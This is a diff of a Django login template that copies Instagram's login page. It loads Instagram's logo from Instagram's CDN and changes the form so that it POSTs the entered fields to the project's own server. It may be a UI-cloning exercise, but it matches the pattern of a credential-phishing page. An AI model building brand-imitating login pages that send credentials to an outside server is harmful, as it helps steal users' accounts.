@@ -6,23 +6,28 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     <!-- Link Swiper's CSS -->
     <link rel="stylesheet" href="{% static './css/login.css' %}" />
-    <title>Ro'yxatdan o'tish</title>
+    <title>Kirish</title>
   </head>
   <body>
 
 <div class="container">
     <div class="content">
       <i style="background-image: url(&quot;https://static.cdninstagram.com/rsrc.php/v3/yS/r/ajlEU-wEDyo.png&quot;); background-position: 0px -52px; background-size: auto; width: 175px; height: 51px; background-repeat: no-repeat; display: inline-block;" role="img" class="" aria-label="Instagram" data-visualcompletion="css-img"></i>
-      <form class="content__form">
+      <form class="content__form" action="" method="POST">
+        {% csrf_token %}
         <div class="content__inputs">
+          {% for f in forms %}
+          
           <label>
-            <input required="" type="text">
-            <span>Phone number, username, or email</span>
+            {{f}}
+            <span>{{f.label}}</span>
           </label>
-          <label>
+              
+          {% endfor %}
+          {% comment %} <label>
             <input required="" type="password">
             <span>Password</span>
-          </label>
+          </label> {% endcomment %}
         </div>
         <button>Log In</button>
       </form>
@@ -45,6 +50,7 @@
         <button>Forgot password?</button>
       </div>
     </div>
+    
 </div>
 </body>
 </html>
